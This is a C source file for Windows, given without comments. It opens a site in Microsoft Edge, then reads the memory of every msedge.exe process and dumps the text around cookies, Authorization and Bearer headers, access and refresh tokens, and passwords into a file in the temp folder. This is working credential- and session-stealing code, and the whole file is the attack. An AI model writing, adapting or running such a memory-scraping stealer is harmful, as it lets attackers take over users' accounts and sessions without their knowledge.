#include <windows.h>
#include <tlhelp32.h>
#include <shellapi.h>
#include <stdio.h>

#define CHUNK_SIZE 65536

static const char *needles[] = {
    "Set-Cookie", "set-cookie",
    "Authorization", "Bearer ",
    "access_token", "refresh_token",
    "password", "credential",
    NULL
};

static void scan_pid(DWORD pid, const char *site, FILE *f) {
    HANDLE hp = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hp) return;

    SIZE_T site_len = strlen(site);
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    BYTE *addr = (BYTE *)si.lpMinimumApplicationAddress;
    BYTE *maxaddr = (BYTE *)si.lpMaximumApplicationAddress;
    MEMORY_BASIC_INFORMATION mbi;
    BYTE buf[CHUNK_SIZE];

    BOOL site_found = FALSE;
    for (BYTE *p = addr; p < maxaddr; ) {
        if (VirtualQueryEx(hp, p, &mbi, sizeof(mbi)) != sizeof(mbi)) {
            p += 4096;
            continue;
        }
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY |
                            PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            BYTE *base = (BYTE *)mbi.BaseAddress;
            SIZE_T left = mbi.RegionSize;
            while (left > 0) {
                SIZE_T chunk = left > CHUNK_SIZE ? CHUNK_SIZE : left;
                SIZE_T nread = 0;
                if (ReadProcessMemory(hp, base, buf, chunk, &nread) && nread >= site_len) {
                    for (SIZE_T i = 0; i + site_len <= nread; i++) {
                        if (memcmp(buf + i, site, site_len) == 0) {
                            site_found = TRUE;
                            break;
                        }
                    }
                }
                if (site_found) break;
                base += chunk;
                left -= chunk;
            }
        }
        if (site_found) break;
        p = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
    }

    if (!site_found) {
        CloseHandle(hp);
        return;
    }

    for (BYTE *p = addr; p < maxaddr; ) {
        if (VirtualQueryEx(hp, p, &mbi, sizeof(mbi)) != sizeof(mbi)) {
            p += 4096;
            continue;
        }
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY |
                            PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            BYTE *base = (BYTE *)mbi.BaseAddress;
            SIZE_T left = mbi.RegionSize;
            while (left > 0) {
                SIZE_T chunk = left > CHUNK_SIZE ? CHUNK_SIZE : left;
                SIZE_T nread = 0;
                if (ReadProcessMemory(hp, base, buf, chunk, &nread) && nread > 0) {
                    for (int n = 0; needles[n]; n++) {
                        SIZE_T nlen = strlen(needles[n]);
                        for (SIZE_T i = 0; i + nlen <= nread; i++) {
                            if (memcmp(buf + i, needles[n], nlen) == 0) {
                                SIZE_T start = i > 80 ? i - 80 : 0;
                                SIZE_T end = i + 200 < nread ? i + 200 : nread;
                                for (SIZE_T j = start; j < end; j++) {
                                    unsigned char c = buf[j];
                                    fputc(c >= 0x20 && c < 0x7F ? c : '.', f);
                                }
                                fputc('\n', f);
                                fflush(f);
                                i += nlen - 1;
                            }
                        }
                    }
                }
                base += chunk;
                left -= chunk;
            }
        }
        p = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
    }

    CloseHandle(hp);
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;

    const char *site = argv[1];

    ShellExecuteA(NULL, "open", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", site, NULL, SW_SHOWNORMAL);
    Sleep(5000);

    WCHAR tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    char tmp_a[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, tmp, -1, tmp_a, MAX_PATH, NULL, NULL);
    strcat(tmp_a, "out.txt");

    FILE *f = fopen(tmp_a, "w");
    if (!f) return 1;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        fclose(f);
        return 1;
    }

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"msedge.exe") == 0) {
                scan_pid(pe.th32ProcessID, site, f);
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    fclose(f);
    return 0;
}